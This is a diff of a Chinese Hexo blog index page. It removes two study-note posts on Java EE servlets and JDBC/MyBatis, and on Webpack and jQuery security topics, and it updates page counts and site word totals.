-<h2 id="JavaEE-HTTP-Servlet-路由-周期"><a href="#JavaEE-HTTP-Servlet-路由-周期" class="headerlink" title="JavaEE-HTTP-Servlet&amp;路由&amp;周期"></a>JavaEE-HTTP-Servlet&amp;路由&amp;周期</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52173163/article/details/121110753">https://blog.csdn.net/qq_52173163/article/details/121110753</a>  </p>
-<ul>
-<li><p>1、解释<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。  </p>
-</li>
-<li><p>2、创建和使用Servlet<br>-创建一个类继承HttpServlet<br>-web.xml配置Servlet路由<br>-WebServlet配置Servlet路由<br>-写入内置方法(init service destroy doget dopost)  </p>
-</li>
-<li><p>3、Servlet生命周期<br>见图  </p>
-</li>
-<li><p>4、处理接受和回显  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest       — ServletRequest的子接口  </span><br><span class="line">getParameter(name)       — String 通过name获得值  </span><br><span class="line">getParameterValues       — String[ ] 通过name获得多值  </span><br><span class="line">  </span><br><span class="line">HttpServletResponse      — ServletResponse的子接口   </span><br><span class="line">setCharacterEncoding()   — 设置编码格式  </span><br><span class="line">setContentType()         — 设置解析语言  </span><br><span class="line">getWriter()              — 获得一个PrintWriter字符输出流输出数据  </span><br><span class="line">PrintWriter              — 接受符合类型数据  </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="JavaEE-数据库-JDBC-Mybatis-库"><a href="#JavaEE-数据库-JDBC-Mybatis-库" class="headerlink" title="JavaEE-数据库-JDBC&amp;Mybatis&amp;库"></a>JavaEE-数据库-JDBC&amp;Mybatis&amp;库</h2><p>(java和数据库连接，三种方式，自带官方库jdbc、第三方 hibernate和mybatis)  </p>
-<ul>
-<li><p>原生态数据库开发：JDBC<br>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！  </p>
-</li>
-<li><p>1、下载jar<br><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a>  </p>
-</li>
-<li><p>2、引用封装jar<br>创建lib目录，复制导入后，添加为库  </p>
-</li>
-<li><p>3、注册数据库驱动  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  </span><br></pre></td></tr></table></figure></li>
-<li><p>4、建立数据库连接  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;jdbc:mysql://localhost:3306/demo01&quot;</span>;</span><br><span class="line">Connection connection=DriverManager.getConnection(url,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br></pre></td></tr></table></figure></li>
-<li><p>5、创建Statement执行SQL  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Statement statement= connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br></pre></td></tr></table></figure></li>
-<li><p>6、结果ResultSet进行提取  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">page_title</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;page_title&quot;</span>);</span><br><span class="line">    .......</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>7、安全修复SQL注入：预编译<br>原理：提前编译好执行逻辑，你注入的语句不会改变原有逻辑！  </p>
-</li>
-<li><p>8、框架数据库开发：Mybatis<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mybatis是一款优秀的持久层框架,避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集的过程，减少了代码的冗余，减少程序员的操作。</p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/13/31%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-webpack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/13/31%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-webpack/" class="post-title-link" itemprop="url">31安全开发-webpack</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-13 10:03:17" itemprop="dateCreated datePublished" datetime="2023-10-13T10:03:17+08:00">2023-10-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:10:23" itemprop="dateModified" datetime="2023-11-06T21:10:23+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>25、三方库-JQuery-使用&amp;安全</li>
-<li>26、打包器-WebPack-使用&amp;安全</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>内容筹备中……</li>
-</ul>
-<h2 id="打包器-WebPack-使用-安全"><a href="#打包器-WebPack-使用-安全" class="headerlink" title="打包器-WebPack-使用&amp;安全"></a>打包器-WebPack-使用&amp;安全</h2><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA">https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Webpack是一个模块打包器。在Webpack中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。  </p>
-<h3 id="五个核心概念"><a href="#五个核心概念" class="headerlink" title="五个核心概念:"></a>五个核心概念:</h3><ol>
-<li>【入口(entry)】：指示webpack应该使用哪个模块，来作为构建内部依赖图开始。  </li>
-<li>【输出(output)】：在哪里输出文件，以及如何命名这些文件。  </li>
-<li>【Loader】：处理那些非JavaScript文件（webpack 自身只能解析 JavaScript和json）。webpack 本身只能处理JS、JSON模块，如果要加载其他类型的文件(模块)，就需要使用对应的loader。  </li>
-<li>【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。  </li>
-<li>【模式(mode)】：有生产模式production和开发模式development。</li>
-</ol>
-<h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>1、创建需打包文件<br>2、安装webpack库<br>3、创建webpack配置文件<br>4、运行webpack打包命令  </p>
-<h3 id="安全："><a href="#安全：" class="headerlink" title="安全："></a>安全：</h3><p>1、WebPack源码泄漏-模式选择<br>2、模糊提取安全检查-PacketFuzzer<br><a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>原生态JS：前端语言直接浏览器显示源代码<br>NodeJS：服务段语言浏览器不显示源代码<br>WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue）  </p>
-<h2 id="第三方库-JQuery-使用-安全"><a href="#第三方库-JQuery-使用-安全" class="headerlink" title="第三方库-JQuery-使用&amp;安全"></a>第三方库-JQuery-使用&amp;安全</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。设计目的是为了写更少的代码，做更多的事情。它封装JavaScript常用功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。  </p>
-<p>1、使用：<br>引用路径：<a target="_blank" rel="noopener" href="https://www.jq22.com/jquery-info122">https://www.jq22.com/jquery-info122</a><br>2、安全：<br>检测：<a target="_blank" rel="noopener" href="http://research.insecurelabs.org/jquery/test/">http://research.insecurelabs.org/jquery/test/</a><br>测试：CVE-2020-11022&#x2F;CVE-2020-11023<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44309905/article/details/120902867">https://blog.csdn.net/weixin_44309905/article/details/120902867</a>  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1516,7 +1518,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1592,19 +1594,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">153k</span>
+    <span title="站点总字数">162k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:19</span>
+    <span title="站点阅读时长">2:27</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共57.5k字</span>
+  <span class="post-count">博客全站共60.3k字</span>
 </div>
 
 
